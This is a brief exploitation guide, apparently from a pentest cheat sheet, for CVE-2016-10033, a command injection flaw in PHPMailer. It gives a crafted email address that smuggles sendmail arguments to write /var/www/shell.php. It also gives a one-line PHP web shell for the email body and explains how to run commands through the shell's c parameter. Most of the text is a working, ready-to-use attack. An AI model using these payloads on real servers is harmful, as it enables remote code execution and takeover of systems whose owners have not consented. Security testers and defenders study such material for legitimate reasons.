# CVE-2016-10033 / PHPMailer RCE

If the server relies on PHPMailer to send emails, we can get command injection in that.

### Exploitation

The exploitation of this issue is done in two steps:

- Create a file with a PHP extension in the web root of the server.
- Access the newly created file.

To create the file, you can inject some extra-arguments to the command as part of the email address:

```
"attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1
```

This will allow us to create the file `/var/www/shell.php`. To get code execution, we also need to inject a web shell in the email's body:

```
<?php system($_GET['c']);?>
```

Finally, you need to access your web shell to execute commands using the `c` parameter.

